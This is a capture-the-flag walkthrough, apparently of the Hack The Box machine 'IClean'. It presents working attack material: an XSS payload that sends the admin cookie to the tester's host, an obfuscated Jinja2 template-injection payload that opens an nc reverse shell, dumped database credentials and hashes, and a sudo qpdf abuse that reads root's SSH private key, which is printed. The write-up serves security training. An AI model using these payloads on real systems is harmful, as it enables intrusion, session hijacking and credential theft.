### Enumeration

```bash
nmap -sC -sV -p- --min-rate 10000 10.129.240.52 -oA iclean
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-06 21:05 CEST
Nmap scan report for 10.129.240.52
Host is up (0.10s latency).
Not shown: 42923 filtered tcp ports (no-response), 22610 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Web enum

```bash
whatweb 10.129.240.52                                                                                                                            
http://10.129.240.52 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.240.52], Meta-Refresh-Redirect[http://capiclean.htb]
ERROR Opening: http://capiclean.htb - no address for capiclean.htb
```

We've got the hostname!
![](images/capiclean.png)

Some dir fuzzing:
```bash
ffuf -u http://capiclean.htb/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

login                   [Status: 200, Size: 2106, Words: 297, Lines: 88, Duration: 46ms]
services                [Status: 200, Size: 8592, Words: 2325, Lines: 193, Duration: 53ms]
team                    [Status: 200, Size: 8109, Words: 2068, Lines: 183, Duration: 54ms]
quote                   [Status: 200, Size: 2237, Words: 98, Lines: 90, Duration: 48ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 44ms]
dashboard               [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 49ms]
choose                  [Status: 200, Size: 6084, Words: 1373, Lines: 154, Duration: 174ms]
```

The `/quote` page was vulnerable to XSS and we were able to grab an admin cookie.

HTTP Request:

```http
POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Length: 169
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://capiclean.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Referer: http://capiclean.htb/quote
Accept-Encoding: gzip, deflate, br
Connection: close

service=<img+src%3dx+onerror%3d"location.href%3d'http%3a//10.10.16.8/%3fc%3d'%2b+document.cookie">%26service=Tile+%26+Grout&service=Office+Cleaning&email=test%40test.htb

```
![](images/xss_cookie.png)

Our webserver catched the cookie:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.240.52 - - [06/Apr/2024 21:19:24] "GET /?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhA16w.YBZzKLSAVslmorVl9-ktQCJY8x0 HTTP/1.1" 200 -
```

Now setup the session cookie and access admin dashboard over `/dashboard`
![](images/cookie.png)

Admin dashboard:
![](images/admin_dashboard.png)


We had to generate an invoice first:

![](images/invoice1.png)


![](images/invoice2.png)

Now we had to generate a QR Code with the Invoice ID and get a new textbox:
![](images/textbox_shell.png)

In the qr link we entered a mkfifo reverse shell payload:
```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.8 1337 >/tmp/f')|attr('read')()}}
```

And got a shell as `www-data` 

In the same folder we dropped there was a file called `app.py` which contains db creds:
```python
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

Connect to the mysql database and collect user hashes:

```bash
mysql -h 127.0.0.1 -u iclean -p -D capiclean

mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+

mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+

```

Crackstation did the job:
![](crackstation.png)


| user     | pass             |
| -------- | ---------------- |
| consuela | simple and clean |

SSH open :) !

```bash
ssh consuela@10.129.240.52 

consuela@iclean:~$ cat user.txt 
89bfbb5add47ac804dbdb693313fc7b1

```

### Root Flag / Privilege Escalation

The user can run a binary as sudo
```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

We found an unintended way to get the root flag:
```bash
consuela@iclean:/opt/app$ sudo /usr/bin/qpdf @/root/root.txt out.pdf
qpdf: open f9f10e670abd6e3b92de272bde2bf2f4: No such file or directory
```

With the `qpdf` we can get the private key file from root as well.

Here are the steps:

```bash
sudo /usr/bin/qpdf --empty --add-attachment /root/.ssh/id_rsa --mimetype=text/plain -- among1.pdf

sudo /usr/bin/qpdf --list-attachments among1.pdf

sudo /usr/bin/qpdf --show-attachment=id_rsa among1.pdf

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----

# Save to a file and connect as root
root@iclean:~# id
uid=0(root) gid=0(root) groups=0(root)
```
